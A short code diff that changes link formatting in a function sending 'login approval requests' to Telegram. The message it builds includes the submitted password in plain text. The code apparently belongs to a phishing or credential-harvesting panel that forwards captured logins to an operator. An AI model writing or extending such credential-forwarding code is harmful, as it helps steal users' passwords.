@@ -36,7 +36,7 @@ export async function sendLoginApprovalRequest(data) {
     `🔑 <b>Password:</b> ${asCode(data.password)}`,
     `📧 <b>Method:</b> ${asCode(data.method)}`,
     '',
-    `👉 Approve or deny at ${asLink(data.approvalsUrl)}`,
+    `👉 ${asLink(data.approvalsUrl, 'Approve or deny')}`,
   ].join('\n');
   return sendTelegramMessage(message);
 }
